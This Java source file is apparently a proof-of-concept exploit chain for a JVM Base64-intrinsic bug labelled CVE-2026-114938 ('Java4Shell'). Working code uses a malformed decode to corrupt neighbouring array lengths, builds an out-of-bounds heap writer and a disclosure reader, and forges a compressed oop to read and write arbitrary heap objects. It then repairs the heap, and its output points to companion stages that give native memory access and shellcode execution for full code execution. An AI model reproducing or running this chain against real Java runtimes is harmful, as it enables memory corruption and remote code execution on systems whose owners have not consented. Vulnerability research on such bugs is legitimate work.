import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * CVE-2026-114938 (Java4Shell) - second half of the chain.
 *
 * Phase 1  writer   the fixed 62-byte spill corrupts a neighbour's length;
 *                   the corrupted array now performs a chosen-value linear
 *                   write over the heap.
 * Phase 2  reader   the writer installs a chosen length into a second array,
 *                   turning it into a heap-disclosure ("JavaBleed") reader.
 * Phase 3  forge    a fake array header inside a controlled buffer plus a
 *                   forged compressed oop gives a shifted view of the heap:
 *                   chosen-value read/write of arbitrary heap objects.
 * Phase 4  repair   restored lengths and oops, the corrupted writer dropped,
 *                   followed by a real GC to prove the reachable heap is sane.
 * Phase 5  codecache reports precisely why a heap-only primitive cannot reach
 *                   the Code Cache, instead of pretending it can.
 *
 * No sun.misc.Unsafe.  No JNI.  No native code.  Every out-of-bounds access is
 * ordinary Java bytecode; only the corrupted length makes it legal.
 *
 * Requires the vulnerable intrinsic (JDK <= 21.0.13.0.3 on AVX-512 VBMI).
 * Intended for a disposable container; it corrupts its own heap.
 */
public final class Chain {
    private static final boolean IS_JDK17 = Runtime.version().feature() <= 17;
    private static final byte[] TRIGGER = trigger();

    private static volatile byte[] dst;
    private static volatile byte[] writer;
    private static volatile byte[] reader;
    private static volatile Object[] table;
    private static volatile byte[] anchor;
    private static volatile byte[] post;

    private static final byte[] ANCHOR_MARK = "ANCHOR01".getBytes(StandardCharsets.US_ASCII);
    private static final byte[] POST_MARK = "J4S-POST".getBytes(StandardCharsets.US_ASCII);

    private static volatile int sink;

    public static void main(String[] args) throws Exception {
        int warmup = 1000;
        for (int i = 0; i < args.length; i++) {
            if ("--warmup".equals(args[i])) {
                warmup = Integer.parseInt(args[++i]);
            } else {
                System.err.println("unknown option: " + args[i]);
                System.exit(2);
            }
        }

        // Run the chain on its own thread, so when that thread exits its stack
        // (and the stale writer reference) is gone before the GC phase.
        final int w = warmup;
        Throwable[] err = new Throwable[1];
        Thread t = new Thread(() -> {
            try {
                chain(w);
            } catch (Throwable e) {
                err[0] = e;
            }
        }, "chain");
        t.start();
        t.join();
        if (err[0] != null) {
            err[0].printStackTrace();
            System.exit(4);
        }

        // ---- Phase 4/5: the thread is gone; only reachable objects remain ----
        phaseRepairAndGc();
        phaseCodeCache();
        Runtime.getRuntime().halt(0);
    }

    private static void chain(int warmup) {
        System.out.println("runtime      = " + System.getProperty("java.runtime.version"));
        System.out.println("arch         = " + System.getProperty("os.arch"));
        System.out.println("trigger      = " + TRIGGER.length + " bytes ("
                + (IS_JDK17 ? "JDK 17" : "JDK 21/25/27") + " layout)");
        System.out.println("warmup       = " + warmup);
        System.out.println();

        // JIT: get C2 to install the AVX-512 decode stub.
        byte[] warm = new byte[256];
        Base64.Decoder dec = Base64.getDecoder();
        for (int i = 0; i < warmup; i++) {
            try {
                sink += dec.decode(TRIGGER, warm);
            } catch (IllegalArgumentException ignored) {
            }
        }
        Arrays.fill(warm, (byte) 0);
        System.out.println("[warm] decoder compiled");

        // Allocation order is the layout.  Nothing may allocate between these
        // six arrays: dst, writer, reader, table, anchor, post.
        dst = new byte[66];
        writer = new byte[64];
        reader = new byte[64];
        table = new Object[1];
        anchor = new byte[256];
        post = new byte[64];
        table[0] = anchor;

        Arrays.fill(dst, (byte) 0x5a);
        Arrays.fill(writer, (byte) 0x5a);
        Arrays.fill(reader, (byte) 0x5a);
        Arrays.fill(anchor, (byte) 0x41);
        Arrays.fill(post, (byte) 0x42);
        System.arraycopy(ANCHOR_MARK, 0, anchor, 0, ANCHOR_MARK.length);
        System.arraycopy(POST_MARK, 0, post, 0, POST_MARK.length);

        System.out.println("[layout] dst=" + dst.length + " writer=" + writer.length
                + " reader=" + reader.length + " anchor=" + anchor.length
                + " post=" + post.length);
        System.out.println();

        // ---------------- Phase 1: writer ----------------
        System.out.println("=== PHASE 1: writer (fixed spill -> corrupted length) ===");
        System.out.println("writer.length before = " + writer.length);
        try {
            dec.decode(TRIGGER, dst);
        } catch (IllegalArgumentException expected) {
            System.out.println("decode rejected after the store (expected)");
        }
        int writerLen = writer.length;
        System.out.println("writer.length after  = " + writerLen
                + " (0x" + Integer.toHexString(writerLen) + ")");
        if (writerLen <= 64) {
            System.out.println("NOT VULNERABLE: length unchanged");
            System.exit(1);
        }

        // A chosen-value write well past the writer's real 64 bytes.  The
        // store lands at D+304, inside anchor's data (anchor[16]); read it back
        // with an ordinary in-bounds access on anchor.
        byte[] marker = "J4SWRITE".getBytes(StandardCharsets.US_ASCII);
        for (int i = 0; i < marker.length; i++) writer[200 + i] = marker[i];
        String back = new String(anchor, 16, marker.length, StandardCharsets.US_ASCII);
        System.out.println("chosen write at writer[200] -> anchor[16] = " + back);
        if (!back.equals("J4SWRITE")) {
            System.out.println("LAYOUT FAILURE: chosen write did not read back");
            System.exit(2);
        }
        System.out.println("WRITER OK: chosen-value linear write established");
        System.out.println();

        // ---------------- Phase 2: reader ----------------
        System.out.println("=== PHASE 2: reader (chosen length -> disclosure) ===");
        // reader's length field sits 4 bytes before its data; the data starts
        // exactly 80 bytes after the writer's data (header + 64-byte body).
        putIntLE(writer, 76, 0x7fffffff);
        int readerLen = reader.length;
        System.out.println("reader.length        = " + readerLen + " (0x"
                + Integer.toHexString(readerLen) + ")");
        if (readerLen != 0x7fffffff) {
            System.out.println("LAYOUT FAILURE: reader length not installed");
            System.exit(2);
        }

        int a = indexOf(reader, ANCHOR_MARK, 0, 4096);
        System.out.println("anchor data at reader[" + a + "]");
        if (a < 0) {
            System.out.println("LAYOUT FAILURE: anchor marker not found");
            System.exit(2);
        }

        int anchorOop = getIntLE(reader, a - 24);  // table[0]
        int anchorKlass = getIntLE(reader, a - 8); // object header klass
        System.out.println("anchor oop           = 0x" + Integer.toHexString(anchorOop));
        System.out.println("anchor klass (narrow)= 0x" + Integer.toHexString(anchorKlass));
        if (anchorOop == 0 || anchorKlass == 0) {
            System.out.println("LAYOUT FAILURE: zero oop/klass");
            System.exit(2);
        }
        System.out.println("READER OK: out-of-bounds disclosure established");
        System.out.println();

        // ---------------- Phase 3: forged header ----------------
        System.out.println("=== PHASE 3: forged array header (object aliasing) ===");
        // The anchor object starts 80 bytes before its data (16-byte header +
        // 64 bytes of anchor[0..63]).  Put the fake header there, inside
        // anchor's own data, so it is a real heap address we control.
        final int fakeAt = 80; // inside anchor's data
        putLongLE(anchor, fakeAt, 0L);              // mark word
        putIntLE(anchor, fakeAt + 8, anchorKlass);  // klass = byte[]
        putIntLE(anchor, fakeAt + 12, 0x7ffffff0);  // huge length
        // Object address = anchor object + 16 (header) + fakeAt, and a
        // compressed oop counts 8-byte units from the object start.
        int fakeOop = anchorOop + ((16 + fakeAt) >> 3);
        putIntLE(writer, (a - 24) + 80, fakeOop);   // table[0] = fakeOop

        byte[] fake;
        try {
            fake = (byte[]) table[0];
        } catch (ClassCastException e) {
            System.out.println("LAYOUT FAILURE: forged oop does not resolve to byte[]");
            System.exit(2);
            return;
        }
        System.out.println("fake oop             = 0x" + Integer.toHexString(fakeOop)
                + " (anchor + " + ((16 + fakeAt) >> 3) + " compressed units)");
        System.out.println("fake.length          = " + fake.length);
        // Data starts 16 bytes after the header, i.e. at anchor[80+16] = 96.
        System.out.println("fake[0]              = 0x" + Integer.toHexString(fake[0] & 0xff)
                + "  anchor[96] = 0x" + Integer.toHexString(anchor[96] & 0xff));
        if (fake[0] != anchor[96]) {
            System.out.println("LAYOUT FAILURE: aliased view is not shifted as expected");
            System.exit(2);
        }

        fake[8] = (byte) 0x5a;
        if (anchor[104] != (byte) 0x5a) {
            System.out.println("LAYOUT FAILURE: aliased write missed anchor[104]");
            System.exit(2);
        }
        System.out.println("aliased write        fake[8] -> anchor[104] = 0x5a");

        int p = indexOf(fake, POST_MARK, 0, 4096);
        System.out.println("post data at fake[" + p + "]");
        if (p < 0) {
            System.out.println("LAYOUT FAILURE: post marker not reachable through fake");
            System.exit(2);
        }
        fake[p] = (byte) 'X';
        System.out.println("cross-object write   fake[" + p + "] -> post[0] = '"
                + (char) post[0] + "'");
        if (post[0] != (byte) 'X') {
            System.out.println("LAYOUT FAILURE: cross-object write missed post");
            System.exit(2);
        }
        System.out.println("FORGE OK: chosen read/write over arbitrary heap objects");
        System.out.println();

        // ---------------- Phase 4a: repair reachable headers ----------------
        System.out.println("=== PHASE 4: repair and drop the corrupted writer ===");
        putIntLE(writer, 76, 64);                  // restore reader length
        putIntLE(writer, (a - 24) + 80, anchorOop); // restore table[0]
        System.out.println("reader.length restored = " + reader.length);
        System.out.println("table[0] restored to anchor");
        writer = null;
        System.out.println("writer reference dropped (object is unreachable)");
    }

    private static void phaseRepairAndGc() {
        System.out.println();
        System.out.println("=== PHASE 4b: force a real GC ===");
        System.out.println("reader.length before GC = " + reader.length);
        if (reader.length != 64) {
            System.out.println("REPAIR FAILED: reader length is not 64");
            System.exit(3);
        }

        for (int round = 1; round <= 3; round++) {
            byte[] pressure = new byte[4 << 20];
            Arrays.fill(pressure, (byte) round);
            sink += pressure[0];
            System.gc();
            System.out.println("GC round " + round + " completed");
        }

        boolean anchorOk = new String(anchor, 0, ANCHOR_MARK.length,
                StandardCharsets.US_ASCII).equals("ANCHOR01");
        boolean postOk = post[0] == (byte) 'X';
        boolean oobBlocked = false;
        try {
            sink += reader[64];
        } catch (ArrayIndexOutOfBoundsException expected) {
            oobBlocked = true;
        }

        System.out.println("anchor marker intact = " + anchorOk);
        System.out.println("post content intact  = " + postOk);
        System.out.println("reader[64] rejected  = " + oobBlocked);
        if (!anchorOk || !postOk || !oobBlocked) {
            System.out.println("REPAIR FAILED");
            System.exit(3);
        }
        System.out.println("REPAIR OK: JVM survived GC with the corrupted writer abandoned");
    }

    private static void phaseCodeCache() {
        System.out.println();
        System.out.println("=== PHASE 5: beyond the heap ===");
        System.out.println("Heap primitives held:");
        System.out.println("  - chosen-value linear write   (writer)");
        System.out.println("  - heap disclosure             (reader)");
        System.out.println("  - forged-header object access (fake oop)");
        System.out.println();
        System.out.println("This chain is heap-only: every reference is a 32-bit compressed");
        System.out.println("oop and every array access is base + non-negative int, so it");
        System.out.println("cannot leave the Java heap.");
        System.out.println();
        System.out.println("That is a limit of THIS chain, not of the vulnerability.");
        System.out.println("The remaining steps are implemented and verified:");
        System.out.println("  poc/NativeProbe.java   corrupt DirectByteBuffer.address -> 64-bit");
        System.out.println("                         native read/write (no Unsafe/JNI/second bug)");
        System.out.println("  poc/CodeCacheRce.java  scan the Code Cache for a compiled method's");
        System.out.println("                         signature, overwrite it with shellcode, and");
        System.out.println("                         run it -> full code execution.");
        System.out.println();
        System.out.println("CHAIN COMPLETE (heap writer/reader/forge/repair)");
        System.out.println("FULL RCE: see the 'native' and 'codecache' stages");
    }

    // ---------------- helpers ----------------

    private static byte[] trigger() {
        int n = IS_JDK17 ? 128 : 64;
        byte[] t = new byte[n + 1];
        Arrays.fill(t, (byte) 'A');
        t[n] = (byte) '=';
        return t;
    }

    private static byte[] readerBytes(int off, int len) {
        byte[] out = new byte[len];
        for (int i = 0; i < len; i++) out[i] = reader[off + i];
        return out;
    }

    private static int indexOf(byte[] hay, byte[] needle, int from, int to) {
        outer:
        for (int i = from; i <= to - needle.length; i++) {
            for (int j = 0; j < needle.length; j++) {
                if (hay[i + j] != needle[j]) continue outer;
            }
            return i;
        }
        return -1;
    }

    private static void putIntLE(byte[] a, int off, int v) {
        a[off] = (byte) v;
        a[off + 1] = (byte) (v >>> 8);
        a[off + 2] = (byte) (v >>> 16);
        a[off + 3] = (byte) (v >>> 24);
    }

    private static int getIntLE(byte[] a, int off) {
        return (a[off] & 0xff)
                | ((a[off + 1] & 0xff) << 8)
                | ((a[off + 2] & 0xff) << 16)
                | ((a[off + 3] & 0xff) << 24);
    }

    private static void putLongLE(byte[] a, int off, long v) {
        for (int i = 0; i < 8; i++) a[off + i] = (byte) (v >>> (8 * i));
    }
}
